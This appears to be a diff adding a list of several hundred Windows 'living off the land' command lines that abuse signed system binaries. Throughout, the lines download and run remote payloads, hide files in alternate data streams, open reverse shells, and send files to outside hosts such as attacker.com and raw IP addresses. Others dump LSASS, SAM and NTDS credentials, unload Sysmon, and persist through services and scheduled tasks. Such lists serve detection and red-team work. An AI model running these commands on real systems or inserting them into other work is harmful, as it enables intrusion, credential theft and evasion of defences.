@@ -1,0 +1,430 @@
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+start ms-appinstaller://?source=https://www.example.org/file.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p
+C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
+C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su cmd /c c:\windows\system32\calc.exe
+ATBroker.exe /start malware
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+bash.exe -c 'cat file.zip > /dev/tcp/192.168.1.10/24'
+bash.exe -c "cmd /c c:\windows\system32\calc.exe"
+bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
+certoc.exe -LoadDLL C:\Windows\Temp\file.dll
+certoc.exe -GetCACAPS https://www.example.org/file.ps1
+CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
+CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext
+certutil.exe -urlcache -f https://www.example.org/file.exe file.exe
+certutil.exe -verifyctl -f https://www.example.org/file.exe file.exe
+certutil.exe -URL https://www.example.org/file.exe
+certutil.exe -urlcache -f https://www.example.org/file.ps1 C:\Windows\Temp\file.ext:ttt
+certutil -encode file.ext file.base64
+certutil -decode file.base64 file.ext
+certutil -decodehex file.hex file.ext
+cipher /w:C:\Windows\Temp\folder
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://www.example.org/file.sct ^scrobj.dll > file.ext:payload.bat
+cmd.exe - < file.ext:payload.bat
+type \\servername\C$\Windows\Temp\file.ext > C:\Windows\Temp\file.ext
+type C:\Windows\Temp\file.ext > \\servername\C$\Windows\Temp\file.ext
+cmdkey /list
+cmdl32 /vpn /lan %cd%\config
+cmstp.exe /ni /s C:\Windows\Temp\file.inf
+cmstp.exe /ni /s https://www.example.org/file.inf
+colorcpl file.ext
+ComputerDefaults.exe
+ConfigSecurityPolicy.exe C:\Windows\Temp\file.ext https://www.example.org/file.ext
+ConfigSecurityPolicy.exe https://www.example.org/file.ext
+conhost.exe cmd /c c:\windows\system32\calc.exe
+conhost.exe --headless cmd /c c:\windows\system32\calc.exe
+control.exe C:\Windows\Temp\file.ext:evil.dll
+control.exe C:\Windows\Temp\file.cpl
+csc.exe -out:file.exe file.cs
+csc -target:library file.cs
+cscript //e:vbscript C:\Windows\Temp\file.ext:script.vbs
+CustomShellHost.exe
+DataSvcUtil /out:C:\Windows\Temp\file.ext /uri:https://www.example.org/file.ext
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.example.org/file.ext /eventName:desktopimgdownldr
+DeviceCredentialDeployment
+rundll32.exe dfshim.dll,ShOpenVerbApplication https://www.example.org/file.ext
+diantz.exe C:\Windows\Temp\file.exe C:\Windows\Temp\file.ext:targetFile.cab
+diantz.exe \\servername\C$\Windows\Temp\file.exe C:\Windows\Temp\file.cab
+diantz /f file.ddf
+diskshadow.exe /s file.txt
+diskshadow> exec file.exe
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\servername\C$\Windows\Temp\file.dll
+esentutl.exe /y C:\Windows\Temp\file.source.vbs /d C:\Windows\Temp\file.dest.vbs /o
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d C:\Windows\Temp\file.dit
+esentutl.exe /y C:\Windows\Temp\file.exe /d C:\Windows\Temp\file.ext:file.exe /o
+esentutl.exe /y C:\Windows\Temp\file.ext:file.exe /d C:\Windows\Temp\file.exe /o
+esentutl.exe /y \\servername\C$\Windows\Temp\file.exe /d C:\Windows\Temp\file.ext:file.exe /o
+esentutl.exe /y \\servername\C$\Windows\Temp\file.source.exe /d \\servername\C$\Windows\Temp\file.dest.exe /o
+eventvwr.exe
+ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "cmd /c c:\windows\system32\calc.exe" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+expand \\servername\C$\Windows\Temp\file.bat C:\Windows\Temp\file.bat
+expand C:\Windows\Temp\file.source.ext C:\Windows\Temp\file.dest.ext
+expand \\servername\C$\Windows\Temp\file.bat C:\Windows\Temp\file.ext:file.bat
+explorer.exe /root,"C:\Windows\Temp\file.exe"
+explorer.exe C:\Windows\Temp\file.exe
+Extexport.exe C:\Windows\Temp\folder foo bar
+extrac32 C:\Windows\Temp\file.cab C:\Windows\Temp\file.ext:file.exe
+extrac32 C:\Windows\Temp\file.cab C:\Windows\Temp\file.ext:file.exe
+extrac32 /Y /C \\servername\C$\Windows\Temp\file.ext C:\Windows\Temp\file.ext
+extrac32.exe /C C:\Windows\Temp\file.source.exe C:\Windows\Temp\file.dest.exe
+findstr /V /L W3AllLov3LolBas C:\Windows\Temp\file.exe > C:\Windows\Temp\file.ext:file.exe
+findstr /V /L W3AllLov3LolBas \\servername\C$\Windows\Temp\file.exe > C:\Windows\Temp\file.ext:file.exe
+findstr /S /I cpassword \\sysvol\policies\*.xml
+findstr /V /L W3AllLov3LolBas \\servername\C$\Windows\Temp\file.exe > C:\Windows\Temp\file.exe
+finger user@example.host.com | more +2 | cmd
+fltMC.exe unload SysmonDrv
+forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c c:\windows\system32\calc.exe"
+forfiles /p c:\windows\system32 /m notepad.exe /c "C:\Windows\Temp\file.ext:evil.exe"
+fsutil.exe file setZeroData offset=0 length=9999999999 C:\Windows\Temp\file.ext
+fsutil.exe usn deletejournal /d c:
+fsutil.exe trace decode
+echo !cmd /c c:\windows\system32\calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+Gpscript /logon
+Gpscript /startup
+HH.exe https://www.example.org/file.bat
+HH.exe C:\Windows\Temp\file.exe
+HH.exe https://www.example.org/file.chm
+C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://www.example.org/file.ext
+ie4uinit.exe -BaseSettings
+set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:C:\Windows\Temp\file.cab
+ieexec.exe https://www.example.org/file.exe
+ieexec.exe https://www.example.org/file.exe
+ilasm.exe C:\Windows\Temp\file.txt /exe
+ilasm.exe C:\Windows\Temp\file.txt /dll
+InfDefaultInstall.exe file.inf
+InstallUtil.exe /logfile= /LogToConsole=false /U file.dll
+InstallUtil.exe /logfile= /LogToConsole=false /U file.dll
+InstallUtil.exe https://www.example.org/file.ext
+jsc.exe file.js
+jsc.exe /t:library file.js
+Ldifde -i -f file.ldf
+makecab C:\Windows\Temp\file.exe C:\Windows\Temp\file.ext:autoruns.cab
+makecab \\servername\C$\Windows\Temp\file.exe C:\Windows\Temp\file.ext:file.cab
+makecab \\servername\C$\Windows\Temp\file.exe C:\Windows\Temp\file.cab
+makecab /F file.ddf
+MavInject.exe 3110 /INJECTRUNNING C:\Windows\Temp\file.dll
+Mavinject.exe 4172 /INJECTRUNNING C:\Windows\Temp\file.ext:file.dll
+Microsoft.Workflow.Compiler.exe file.ext file.log
+Microsoft.Workflow.Compiler.exe file.ext file.log
+Microsoft.Workflow.Compiler.exe file.ext file.log
+mmc.exe -Embedding C:\Windows\Temp\file.msc
+mmc.exe gpedit.msc
+mmc.exe -Embedding C:\Windows\Temp\file.msc
+MpCmdRun.exe -DownloadFile -url https://www.example.org/file.exe -path C:\Windows\Temp\file.exe
+copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://www.example.org/file.exe -path C:\Users\Public\Downloads\evil.exe
+MpCmdRun.exe -DownloadFile -url https://www.example.org/file.exe -path C:\Windows\Temp\file.exe:evil.exe
+msbuild.exe file.xml
+msbuild.exe file.csproj
+msbuild.exe /logger:TargetLogger,C:\Windows\Temp\file.dll;MyParameters,Foo
+msbuild.exe file.proj
+msbuild.exe @file.rsp
+Msconfig.exe -5
+msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\Windows\Temp\file.xml /skip TRUE
+msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\Windows\Temp\file.xml /skip TRUE
+msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
+msedge.exe https://www.example.org/file.exe.txt
+msedge.exe --headless --enable-logging --disable-gpu --dump-dom "https://www.example.org/file.base64.html" > file.b64
+msedge.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe &&"
+mshta.exe file.hta
+mshta.exe vbscript:Close(Execute("GetObject(""script:https://www.example.org/file.sct"")"))
+mshta.exe javascript:a=GetObject("script:https://www.example.org/file.sct").Exec();close();
+mshta.exe "C:\Windows\Temp\file.ext:file.hta"
+mshta.exe https://www.example.org/file.ext
+msiexec /quiet /i file.msi
+msiexec /q /i https://www.example.org/file.ext
+msiexec /y C:\Windows\Temp\file.dll
+msiexec /z C:\Windows\Temp\file.dll
+msiexec /i C:\Windows\Temp\file.msi TRANSFORMS="https://www.example.org/file.mst" /qb
+netsh.exe add helper C:\Windows\Temp\file.dll
+ngen.exe https://www.example.org/file.ext
+odbcconf /a {REGSVR C:\Windows\Temp\file.dll}
+odbcconf INSTALLDRIVER "lolbas-project|Driver=C:\Windows\Temp\file.dll|APILevel=2"
+odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"
+odbcconf -f file.rsp
+OfflineScannerShell
+OneDriveStandaloneUpdater
+pcalua.exe -a file.exe
+pcalua.exe -a \\servername\C$\Windows\Temp\file.dll
+pcalua.exe -a C:\Windows\Temp\file.cpl -c Java
+Pcwrun.exe C:\Windows\Temp\file.exe
+Pcwrun.exe /../../$(calc).exe
+pktmon.exe start --etw
+pktmon.exe filter add -p 445
+pnputil.exe -i -a C:\Windows\Temp\file.inf
+Presentationhost.exe C:\Windows\Temp\file.xbap
+Presentationhost.exe https://www.example.org/file.ext
+print /D:C:\Windows\Temp\file.ext:file.exe C:\Windows\Temp\file.exe
+print /D:C:\Windows\Temp\file.dest.exe C:\Windows\Temp\file.source.exe
+print /D:C:\Windows\Temp\file.dest.exe \\servername\C$\Windows\Temp\file.source.exe
+PrintBrm -b -d \\servername\C$\Windows\Temp\folder -f C:\Windows\Temp\file.zip
+PrintBrm -r -f C:\Windows\Temp\file.ext:hidden.zip -d C:\Windows\Temp\folder
+provlaunch.exe LOLBin
+psr.exe /start /output C:\Windows\Temp\file.zip /sc 1 /gui 0
+rasautou -d file.dll -p export_name -a a -e e
+rdrleakdiag.exe /p 940 /o C:\Windows\Temp\folder /fullmemdmp /wait 1
+rdrleakdiag.exe /p 832 /o C:\Windows\Temp\folder /fullmemdmp /wait 1
+rdrleakdiag.exe /p 832 /o C:\Windows\Temp\folder /fullmemdmp /snap
+reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\Windows\Temp\file.ext:evilreg.reg
+reg save HKLM\SECURITY C:\Windows\Temp\file.1.bak && reg save HKLM\SYSTEM C:\Windows\Temp\file.2.bak && reg save HKLM\SAM C:\Windows\Temp\file.3.bak
+regasm.exe file.dll
+regasm.exe /U file.dll
+regedit /E C:\Windows\Temp\file.ext:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+regedit C:\Windows\Temp\file.ext:regfile.reg
+regini.exe file.ext:hidden.ini
+Register-cimprovider -path C:\Windows\Temp\file.dll
+regsvcs.exe file.dll
+regsvcs.exe file.dll
+regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll
+regsvr32.exe /s /u /i:file.sct scrobj.dll
+regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll
+regsvr32.exe /s /u /i:file.sct scrobj.dll
+replace.exe C:\Windows\Temp\file.cab C:\Windows\Temp\folder /A
+replace.exe \\servername\C$\Windows\Temp\file.exe C:\Windows\Temp\folder /A
+rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
+rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
+rundll32.exe file.ext,EntryPoint
+rundll32.exe \\servername\C$\Windows\Temp\file.dll,EntryPoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://www.example.org/file.ext")
+rundll32.exe -sta {CLSID}
+rundll32 "file.ext:ADSDLL.dll",DllMain
+runexehelper.exe C:\Windows\Temp\file.exe
+Runonce.exe /AlternateShellStartup
+runscripthelper.exe surfacecheck \\?\C:\Windows\Temp\file.txt C:\Windows\Temp\folder
+sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
+sc config {ExistingServiceName} binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start {ExistingServiceName}
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "cmd /c c:\windows\system32\calc.exe"
+schtasks /create /s targetmachine /tn "MyTask" /tr "cmd /c c:\windows\system32\calc.exe" /sc daily
+Scriptrunner.exe -appvscript file.exe
+ScriptRunner.exe -appvscript \\servername\C$\Windows\Temp\file.cmd
+setres.exe -w 800 -h 600
+SettingSyncHost -LoadAndRunDiagScript file.exe
+SettingSyncHost -LoadAndRunDiagScriptNoCab file.bat
+sftp -o ProxyCommand="cmd /c c:\windows\system32\calc.exe" 
+ssh localhost "cmd /c c:\windows\system32\calc.exe"
+ssh -o ProxyCommand="cmd /c c:\windows\system32\calc.exe" .
+stordiag.exe
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"
+tar -cf file.ext:ads C:\Windows\Temp\folder
+tar -xf file.ext:ads
+tar -xf \\servername\C$\Windows\Temp\file.tar
+TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "file.exe"
+ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "file.exe"
+tttracer.exe C:\Windows\Temp\file.exe
+TTTracer.exe -dumpFull -attach 1234
+rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
+vbc.exe /target:exe C:\Windows\Temp\file.vb
+vbc -reference:Microsoft.VisualBasic.dll C:\Windows\Temp\file.vb
+verclsid.exe /S /C {CLSID}
+wab.exe
+wbadmin start backup -backupTarget:C:\Windows\Temp\folder -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
+wbadmin start recovery -version: -recoverytarget:C:\Windows\Temp\folder -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+wbemtest.exe
+winget.exe install --manifest file.yml
+winget.exe install --accept-package-agreements -s msstore {name or ID}
+winget.exe install --accept-package-agreements -s msstore {name or ID}
+wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u file.exe
+wmic.exe process call create "C:\Windows\Temp\file.ext:program.exe"
+wmic.exe process call create "cmd /c c:\windows\system32\calc.exe"
+wmic.exe /node:"192.168.0.1" process call create "cmd /c c:\windows\system32\calc.exe"
+wmic.exe process get brief /format:"https://www.example.org/file.xsl"
+wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"
+wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+WorkFolders
+wscript //e:vbscript file.ext:script.vbs
+echo GetObject("script:https://www.example.org/file.js") > C:\Windows\Temp\file.ext:hi.js && wscript.exe C:\Windows\Temp\file.ext:hi.js
+wsreset.exe
+wuauclt.exe /UpdateDeploymentProvider C:\Windows\Temp\file.dll /RunHandlerComServer
+xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://www.example.org/file.ext
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe https://www.example.org/file.zip
+C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe &&"
+msedgewebview2.exe --no-sandbox --browser-subprocess-path="C:\Windows\Temp\file.exe"
+msedgewebview2.exe --utility-cmd-prefix="cmd /c c:\windows\system32\calc.exe"
+msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe"
+msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="cmd /c c:\windows\system32\calc.exe"
+wt.exe cmd /c c:\windows\system32\calc.exe
+rundll32.exe advpack.dll,LaunchINFSection file.inf,DefaultInstall_SingleUser,1,
+rundll32.exe advpack.dll,LaunchINFSection file.inf,,1,
+rundll32.exe advpack.dll,RegisterOCX file.dll
+rundll32.exe advpack.dll,RegisterOCX file.exe
+rundll32 advpack.dll, RegisterOCX cmd /c c:\windows\system32\calc.exe
+rundll32.exe desk.cpl,InstallScreenSaver C:\Windows\Temp\file.scr
+rundll32.exe desk.cpl,InstallScreenSaver \\servername\C$\Windows\Temp\file.scr
+rundll32.exe dfshim.dll,ShOpenVerbApplication https://www.example.org/file.ext
+rundll32.exe ieadvpack.dll,LaunchINFSection C:\Windows\Temp\file.inf,DefaultInstall_SingleUser,1,
+rundll32.exe ieadvpack.dll,LaunchINFSection C:\Windows\Temp\file.inf,,1,
+rundll32.exe ieadvpack.dll,RegisterOCX file.dll
+rundll32.exe ieadvpack.dll,RegisterOCX file.exe
+rundll32 ieadvpack.dll, RegisterOCX cmd /c c:\windows\system32\calc.exe
+rundll32.exe ieframe.dll,OpenURL C:\Windows\Temp\file.url
+rundll32.exe Mshtml.dll,PrintHTML C:\Windows\Temp\file.hta
+rundll32.exe pcwutl.dll,LaunchApplication file.exe
+rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib https://www.example.org/file.exe
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Windows\Temp\file.inf
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Windows\Temp\file.inf
+rundll32.exe shdocvw.dll,OpenURL C:\Windows\Temp\file.url
+rundll32.exe shell32.dll,Control_RunDLL C:\Windows\Temp\file.dll
+rundll32.exe shell32.dll,ShellExec_RunDLL file.exe
+rundll32 SHELL32.DLL,ShellExec_RunDLL file.exe /arg1 /arg2
+rundll32.exe shell32.dll,#44 file.dll
+rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen https://www.example.org/file.exe
+rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\Windows\Temp\file.inf
+rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\Windows\Temp\file.inf
+rundll32.exe url.dll,OpenURL C:\Windows\Temp\file.hta
+rundll32.exe url.dll,OpenURL C:\Windows\Temp\file.url
+rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+rundll32.exe url.dll,FileProtocolHandler C:\Windows\Temp\file.exe
+rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
+rundll32.exe zipfldr.dll,RouteTheCall file.exe
+rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
+AccCheckConsole.exe -window "Untitled - Notepad" C:\Windows\Temp\file.dll
+AccCheckConsole.exe -window "Untitled - Notepad" C:\Windows\Temp\file.dll
+adplus.exe -hang -pn lsass.exe -o C:\Windows\Temp\folder -quiet
+adplus.exe -c file.xml
+adplus.exe -crash -o "C:\Windows\Temp\folder" -sc file.exe
+adplus.exe -c file.xml
+AgentExecutor.exe -powershell "C:\Windows\Temp\file.ps1" "C:\Windows\Temp\file.1.log" "C:\Windows\Temp\file.2.log" "C:\Windows\Temp\file.3.log" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
+AgentExecutor.exe -powershell "C:\Windows\Temp\file.ps1" "C:\Windows\Temp\file.1.log" "C:\Windows\Temp\file.2.log" "C:\Windows\Temp\file.3.log" 60000 "C:\Windows\Temp\folder" 0 1
+appcert.exe test -apptype desktop -setuppath C:\Windows\Temp\file.exe -reportoutputpath C:\Windows\Temp\file.xml
+appcert.exe test -apptype desktop -setuppath C:\Windows\Temp\file.msi -setupcommandline /q -reportoutputpath C:\Windows\Temp\file.xml
+AppVLP.exe \\servername\C$\Windows\Temp\file.bat
+AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('file.exe','', '', 'open', 1)"
+bginfo.exe file.bgi /popup /nolicprompt
+\\10.10.10.10\webdav\bginfo.exe file.bgi /popup /nolicprompt
+\\live.sysinternals.com\Tools\bginfo.exe \\servername\C$\Windows\Temp\file.bgi /popup /nolicprompt
+bginfo.exe file.bgi /popup /nolicprompt
+\\10.10.10.10\webdav\bginfo.exe file.bgi /popup /nolicprompt
+\\live.sysinternals.com\Tools\bginfo.exe \\servername\C$\Windows\Temp\file.bgi /popup /nolicprompt
+cdb.exe -cf file.wds -o notepad.exe
+cdb.exe -pd -pn {process_name}
+.shell cmd /c c:\windows\system32\calc.exe
+cdb.exe -c file.txt "cmd /c c:\windows\system32\calc.exe"
+coregen.exe /L C:\Windows\Temp\file.dll dummy_assembly_name
+coregen.exe dummy_assembly_name
+coregen.exe /L C:\Windows\Temp\file.dll dummy_assembly_name
+createdump.exe -n -f file.dmp 1234
+csi.exe file.cs
+DefaultPack.EXE /C:"cmd /c c:\windows\system32\calc.exe"
+devinit.exe run -t msi-install -i https://www.example.org/file.msi
+devtoolslauncher.exe LaunchForDeploy C:\Windows\Temp\file.exe "/arg1 /arg2" test
+devtoolslauncher.exe LaunchForDebug C:\Windows\Temp\file.exe "/arg1 /arg2" test
+dnx.exe C:\Windows\Temp\folder
+dotnet.exe file.dll
+dotnet.exe msbuild file.csproj
+dotnet.exe file.dll
+dotnet.exe fsi
+dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
+dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
+dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
+dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
+dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
+dump64.exe 1234 out.dmp
+DumpMinitool.exe --file C:\Windows\Temp\file.ext --processId 1132 --dumpType Full
+Dxcap.exe -c C:\Windows\Temp\file.exe
+ECMangen.exe https://www.example.org/file.ext
+Excel.exe https://www.example.org/file.ext
+fsi.exe file.fsscript
+fsi.exe
+fsianycpu.exe file.fsscript
+fsianycpu.exe
+Mftrace.exe file.exe
+Microsoft.NodejsTools.PressAnyKey.exe normal 1 file.exe
+MSAccess.exe https://www.example.org/file.ext
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="C:\Windows\Temp\file.bat"
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="C:\Windows\Temp\file.bat"
+msdeploy.exe -verb:sync -source:filePath=C:\Windows\Temp\file.source.ext -dest:filePath=C:\Windows\Temp\file.dest.ext
+MsoHtmEd.exe https://www.example.org/file.ext
+mspub.exe https://www.example.org/file.ext
+msxsl.exe file.xml file.xsl
+msxsl.exe https://www.example.org/file.xml https://www.example.org/file.xsl
+msxsl.exe file.xml file.xsl
+msxsl.exe https://www.example.org/file.xml https://www.example.org/file.xml
+msxsl.exe https://www.example.org/file.xml https://www.example.org/file.xsl -o file.ext
+msxsl.exe https://www.example.org/file.xml https://www.example.org/file.xsl -o file.ext:ads-name
+ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+OpenConsole.exe file.exe
+Powerpnt.exe https://www.example.org/file.ext
+procdump.exe -md file.dll explorer.exe
+procdump.exe -md file.dll foobar
+ProtocolHandler.exe https://www.example.org/file.ext
+rcsi.exe file.csx
+Remote.exe /s file.exe anythinghere
+Remote.exe /s file.exe anythinghere
+Remote.exe /s \\servername\C$\Windows\Temp\file.exe anythinghere
+sqldumper.exe 464 0 0x0110
+sqldumper.exe 540 0 0x01100:40
+Sqlps.exe -noprofile
+SQLToolsPS.exe -noprofile -command Start-Process file.exe
+squirrel.exe --download https://www.example.org/file.ext
+squirrel.exe --update https://www.example.org/file.ext
+squirrel.exe --updateRollback=https://www.example.org/file.ext
+squirrel.exe --update https://www.example.org/file.ext
+squirrel.exe --updateRollback=https://www.example.org/file.ext
+te.exe file.wsc
+te.exe file.dll
+teams.exe
+teams.exe --disable-gpu-sandbox --gpu-launcher="cmd /c c:\windows\system32\calc.exe &&"
+TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+Tracker.exe /d file.dll /c C:\Windows\write.exe
+Tracker.exe /d file.dll /c C:\Windows\write.exe
+Update.exe --download https://www.example.org/file.ext
+Update.exe --update=https://www.example.org/file.ext
+Update.exe --update=\\servername\C$\Windows\Temp\folder
+Update.exe --updateRollback=https://www.example.org/file.ext
+Update.exe --processStart file.exe --process-start-args "/arg1 /arg2"
+Update.exe --updateRollback=\\servername\C$\Windows\Temp\folder
+Update.exe --update=https://www.example.org/file.ext
+Update.exe --update=\\servername\C$\Windows\Temp\folder
+Update.exe --updateRollback=https://www.example.org/file.ext
+Update.exe --updateRollback=\\servername\C$\Windows\Temp\folder
+Update.exe --processStart file.exe --process-start-args "/arg1 /arg2"
+Update.exe --createShortcut=file.exe -l=Startup
+Update.exe --removeShortcut=file.exe-l=Startup
+VSDiagnostics.exe start 1 /launch:file.exe
+VSDiagnostics.exe start 2 /launch:file.exe /launchArgs:"/arg1 /arg2"
+VSIISExeLauncher.exe -p file.exe -a "/arg1 /arg2"
+Visio.exe https://www.example.org/file.ext
+VisualUiaVerifyNative.exe
+VSLaunchBrowser.exe .exe https://www.example.org/file.exe
+VSLaunchBrowser.exe .exe C:\Windows\Temp\file.exe
+VSLaunchBrowser.exe .exe \\servername\C$\Windows\Temp\file.ext
+vshadow.exe -nw -exec=C:\Windows\Temp\file.exe C:
+Vsjitdebugger.exe file.exe
+WFMFormat.exe
+wfc.exe C:\Windows\Temp\file.xoml
+WinProj.exe https://www.example.org/file.ext
+winword.exe https://www.example.org/file.ext
+wsl.exe -e /mnt/c/Windows/System32/calc.exe
+wsl.exe -u root -e cat /etc/shadow
+wsl.exe --exec bash -c "cmd /c c:\windows\system32\calc.exe"
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+xbootmgrsleep.exe 1000 "cmd /c c:\windows\system32\calc.exe"
+devtunnel.exe host -p 8080
+vsls-agent.exe --agentExtensionPath C:\Windows\Temp\file.dll
+vstest.console.exe file.dll
+winfile.exe file.exe
+xsd.exe https://www.example.org/file.ext
+powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
+. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess file.ps1
+. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke cmd /c c:\windows\system32\calc.exe
+powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath C:\Windows\Temp\file.exe
+powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; file.exe ;"
+set comspec=C:\Windows\Temp\file.exe & cscript c:\windows\system32\manage-bde.wsf
+copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
